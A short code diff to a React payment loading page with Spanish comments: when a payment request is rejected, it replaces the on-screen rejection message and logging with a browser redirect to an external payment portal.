@@ -101,10 +101,9 @@ export default function LoadingPage(_props: RouteComponentProps) {
       });
       
     } else if (request.status === 'rejected') {
-      setMessage("Su pago ha sido rechazado");
-      // En caso de rechazo, configurar solo la respuesta
-      setResponse(request.response || '');
-      console.log('Solicitud rechazada - configurando respuesta:', request.response || '');
+      // Redirigir al portal externo cuando la solicitud es rechazada
+      window.location.href = 'https://pagoexpress.forum.cl/express/#/';
+      return;
     } else {
       // Para otros estados, actualizar campos individualmente
       // Set response if provided
